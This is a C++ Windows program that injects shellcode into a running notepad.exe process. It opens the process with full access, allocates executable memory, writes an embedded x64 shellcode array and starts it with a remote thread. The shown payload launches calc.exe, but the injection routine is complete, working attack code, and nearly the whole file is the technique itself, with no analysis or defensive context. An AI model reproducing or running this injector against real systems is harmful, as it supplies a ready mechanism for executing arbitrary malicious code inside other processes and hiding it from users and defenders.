#include <Windows.h>
#include <iostream>
#include <stdio.h>
#include <tlhelp32.h>
using namespace std;

unsigned char shellCode[] = {
	0xfc,0x48,0x83,0xe4,0xf0,
	0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,
	0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,
	0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,
	0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,
	0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,
	0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,
	0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,
	0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,
	0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,
	0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,
	0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,
	0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,
	0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,
	0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,
	0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,
	0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,
	0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,
	0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,
	0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,
	0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,
	0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x6d,
	0x64,0x2e,0x65,0x78,0x65,0x20,0x2f,0x63,0x20,0x63,0x61,0x6c,
	0x63,0x2e,0x65,0x78,0x65,0x00
};

size_t shellCodeSize = sizeof(shellCode);

// gets the PID of a running process
DWORD GetProcessID (const wchar_t* processName) {
	DWORD PID = 0;
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		cout << "Failed to get snapshot of running processes" << endl;
		return EXIT_FAILURE;
	}
	
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(hSnapshot, &pe32)) {
		do {
			if (_wcsicmp(pe32.szExeFile, processName) == 0) {
				PID = pe32.th32ProcessID;
				break;
			}
		} while (Process32Next(hSnapshot, &pe32));
	}
	CloseHandle(hSnapshot);
	return PID;
}

int main() {
	const wchar_t* processName = L"notepad.exe";
	DWORD targetPID = GetProcessID(processName);
	PVOID rBuffer;
	DWORD dwPID, dwTID;
	HANDLE hProcess, hThread;

	if (targetPID == 0 or NULL) {
		cout << "Target process not found!" << endl;
		return EXIT_FAILURE;
	}

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);

	if (hProcess == NULL) {
		cout << "Failed to get a handle to the process, error: " << GetLastError() << endl;
		return EXIT_FAILURE;
	}

	cout << "Got a handle to the process\n" << hProcess << endl;

	rBuffer = VirtualAllocEx(hProcess, NULL, shellCodeSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

	cout << "Allocated " << shellCodeSize << " - bytes to the process memory w / PAGE_EXECUTE_READWRITE permissions" << endl;

	if (rBuffer == NULL) {
		cout << "Failed to allocate buffer, error: " << GetLastError() << endl;
		return EXIT_FAILURE;
	}

	WriteProcessMemory(hProcess, rBuffer, shellCode, shellCodeSize, NULL);
	cout << "Wrote shell code to allocated buffer" << endl;

	hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &dwTID);

	if (hThread == NULL) {
		cout << "Failed to get a handle to the new thread, error: " << GetLastError() << endl;
		return EXIT_FAILURE;
	}

	cout << "Got a handle to the newly created thread " << dwTID << "\n" << hProcess << endl;

	cout << "Waiting for thread to finish executing" << endl;
	WaitForSingleObject(hThread, INFINITE);

	cout << "Thread finished executing, cleaning up" << endl;

	CloseHandle(hThread);
	CloseHandle(hProcess);
	cout << "Finished successfully" << endl;

	return EXIT_SUCCESS;
}
